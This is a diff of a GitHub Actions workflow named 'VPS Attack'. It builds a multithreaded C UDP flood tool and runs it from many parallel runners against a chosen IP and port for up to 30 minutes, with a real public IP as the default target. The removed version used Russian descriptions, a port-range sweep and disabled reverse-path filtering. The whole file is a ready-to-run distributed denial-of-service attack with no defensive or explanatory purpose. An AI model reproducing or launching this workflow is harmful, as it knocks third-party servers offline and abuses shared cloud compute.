@@ -1,50 +1,44 @@
-name: vps kill
+ name: VPS Attack
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: 'Целевой IP'
+        description: 'Target IP'
         required: true
+        default: '34.120.12.34'
       port:
-        description: 'Порт (один порт или диапазон через дефис)'
+        description: 'Target Port'
         required: true
-        default: '10000-11000'
+        default: '10001'
       duration:
-        description: 'Длительность атаки в секундах'
+        description: 'Duration (seconds)'
         required: true
-        default: 1800
-      workers:
-        description: 'Количество воркеров'
-        required: false
-        default: 50
-      threads_per_worker:
-        description: 'Потоков на воркер'
-        required: false
-        default: 2000
+        default: '1800'
+      threads:
+        description: 'Threads per worker'
+        required: true
+        default: '2000'
 
 jobs:
-  obliterate:
+  attack:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 50
       matrix:
-        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33]
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
 
     steps:
-      - name: 🎯 SYSTEM HARDENING
+      - name: System Tuning
         run: |
-          echo "=== WORKER ${{ matrix.worker }} ACTIVATED ==="
           sudo sysctl -w net.core.rmem_max=536870912
           sudo sysctl -w net.core.wmem_max=536870912
           sudo sysctl -w net.core.netdev_max_backlog=250000
           sudo sysctl -w net.ipv4.udp_mem="8388608 12582912 16777216"
           sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
-          echo 0 | sudo tee /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null || true
-          echo 0 | sudo tee /proc/sys/net/ipv4/conf/default/rp_filter 2>/dev/null || true
 
-      - name: 💣 COMPILE UDP FLOODER
+      - name: Compile UDP Flooder
         run: |
-          cat > udp_killer.c << 'EOL'
+          cat > flood.c << 'EOF'
           #define _GNU_SOURCE
           #include <stdio.h>
           #include <stdlib.h>
@@ -55,51 +49,33 @@ jobs:
           #include <netinet/in.h>
           #include <arpa/inet.h>
           #include <time.h>
-          #include <signal.h>
-
-          volatile int running = 1;
-          void handler(int sig) { running = 0; }
 
           typedef struct {
               struct sockaddr_in *targets;
               int target_count;
               int duration;
-              int id;
-          } thread_args;
+          } attack_args;
 
           void *attack(void *arg) {
-              thread_args *args = (thread_args*)arg;
+              attack_args *args = (attack_args*)arg;
               int sock = socket(AF_INET, SOCK_DGRAM, 0);
               int buf = 268435456;
               setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
-
+              
               char packet[1518];
               time_t end = time(NULL) + args->duration;
               unsigned int counter = 0;
-
-              const uint32_t magic_values[] = {
-                  0x9B000000, 0xFE000000, 0x00010000, 0xFFFFFFFF,
-                  0x08000000, 0x1700032A, 0x00000000, 0x01000000
-              };
-
-              while (time(NULL) < end && running) {
-                  int target_idx = (counter / 1000) % args->target_count;
+              
+              while (time(NULL) < end) {
+                  int target_idx = (counter / 500) % args->target_count;
                   struct sockaddr_in *addr = &args->targets[target_idx];
-
+                  
                   int size = 64 + (rand() % 1408);
-                  uint32_t magic = magic_values[rand() % 8];
-                  memcpy(packet, &magic, 4);
-                  uint32_t session = counter ^ (time(NULL) << 16);
-                  memcpy(packet + 4, &session, 4);
-
-                  for (int i = 8; i < size; i++) {
-                      packet[i] = (i ^ counter) & 0xFF;
-                  }
-
+                  memset(packet, rand() % 255, size);
+                  
                   int burst = 32 + (rand() % 96);
                   for (int b = 0; b < burst; b++) {
-                      sendto(sock, packet, size, 0,
-                             (struct sockaddr*)addr, sizeof(*addr));
+                      sendto(sock, packet, size, 0, (struct sockaddr*)addr, sizeof(*addr));
                   }
                   counter++;
                   usleep((rand() % 30) * 100);
@@ -109,94 +85,49 @@ jobs:
           }
 
           int main(int argc, char *argv[]) {
-              if (argc != 6) {
-                  fprintf(stderr, "Usage: %s <threads> <duration> <port_start> <port_end> <target_ip>\n", argv[0]);
-                  return 1;
-              }
+              if (argc != 5) return 1;
               
-              signal(SIGINT, handler);
-              srand(time(NULL) ^ getpid());
-
               int threads = atoi(argv[1]);
               int duration = atoi(argv[2]);
-              int ports_start = atoi(argv[3]);
-              int ports_end = atoi(argv[4]);
-              char *target_ip = argv[5];
-
-              int port_count = ports_end - ports_start + 1;
-              struct sockaddr_in *targets = malloc(port_count * sizeof(*targets));
-
-              for (int i = 0; i < port_count; i++) {
-                  targets[i].sin_family = AF_INET;
-                  targets[i].sin_port = htons(ports_start + i);
-                  inet_pton(AF_INET, target_ip, &targets[i].sin_addr);
-              }
-
+              int port = atoi(argv[3]);
+              char *target_ip = argv[4];
+              
+              struct sockaddr_in addr;
+              addr.sin_family = AF_INET;
+              addr.sin_port = htons(port);
+              inet_pton(AF_INET, target_ip, &addr.sin_addr);
+              
+              attack_args args;
+              args.targets = &addr;
+              args.target_count = 1;
+              args.duration = duration;
+              
               pthread_t *pt = malloc(threads * sizeof(pthread_t));
-              thread_args *args = malloc(threads * sizeof(thread_args));
-
               for (int i = 0; i < threads; i++) {
-                  args[i].targets = targets;
-                  args[i].target_count = port_count;
-                  args[i].duration = duration;
-                  args[i].id = i;
-                  pthread_create(&pt[i], NULL, attack, &args[i]);
+                  pthread_create(&pt[i], NULL, attack, &args);
               }
-
+              
               sleep(duration);
-              running = 0;
-              for (int i = 0; i < threads; i++) pthread_join(pt[i], NULL);
-
-              free(targets); free(pt); free(args);
+              for (int i = 0; i < threads; i++) {
+                  pthread_cancel(pt[i]);
+              }
+              
+              free(pt);
               return 0;
           }
-          EOL
+          EOF
+          
+          gcc -O3 -pthread -o flood flood.c
 
-          gcc -O3 -pthread -flto -o udp_killer udp_killer.c
-
-      - name: 🔥 EXECUTE ATTACK
+      - name: Execute Attack
         run: |
-          # Парсим порты
-          PORT_INPUT="${{ github.event.inputs.port }}"
+          echo "🎯 Target: ${{ github.event.inputs.target }}"
+          echo "🚪 Port: ${{ github.event.inputs.port }}"
+          echo "⏱️ Duration: ${{ github.event.inputs.duration }}s"
+          echo "⚡ Worker #${{ matrix.worker }}"
           
-          # Проверяем формат: один порт или диапазон
-          if [[ "$PORT_INPUT" =~ ^[0-9]+$ ]]; then
-              PORTS_START=$PORT_INPUT
-              PORTS_END=$PORT_INPUT
-          elif [[ "$PORT_INPUT" =~ ^([0-9]+)-([0-9]+)$ ]]; then
-              PORTS_START=${BASH_REMATCH[1]}
-              PORTS_END=${BASH_REMATCH[2]}
-          else
-              PORTS_START=10000
-              PORTS_END=11000
-          fi
-
-          echo "🔥 TARGET: ${{ github.event.inputs.target }}"
-          echo "🔥 PORTS: $PORTS_START-$PORTS_END"
-          echo "🔥 DURATION: ${{ github.event.inputs.duration }}s"
-          echo "🔥 WORKER #${{ matrix.worker }}"
-          echo "🔥 THREADS: ${{ github.event.inputs.threads_per_worker }}"
-
-          # Запускаем в фоне и ждем duration секунд
-          ./udp_killer \
-              ${{ github.event.inputs.threads_per_worker }} \
-              ${{ github.event.inputs.duration }} \
-              $PORTS_START $PORTS_END \
-              "${{ github.event.inputs.target }}" &
-          
-          FLOODER_PID=$!
-          echo "Flooder PID: $FLOODER_PID"
-          
-          # Ждем указанное время
+          ./flood ${{ github.event.inputs.threads }} ${{ github.event.inputs.duration }} ${{ github.event.inputs.port }} ${{ github.event.inputs.target }} &
           sleep ${{ github.event.inputs.duration }}
+          pkill -f flood || true
           
-          # Убиваем процесс после окончания времени
-          kill -INT $FLOODER_PID 2>/dev/null || true
-          wait $FLOODER_PID 2>/dev/null || true
-          
-          echo "✅ Attack completed"
-
-      - name: 📊 STATUS
-        if: always()
-        run: |
-          echo "✅ WORKER ${{ matrix.worker }} COMPLETED"
+          echo "✅ Worker ${{ matrix.worker }} finished"
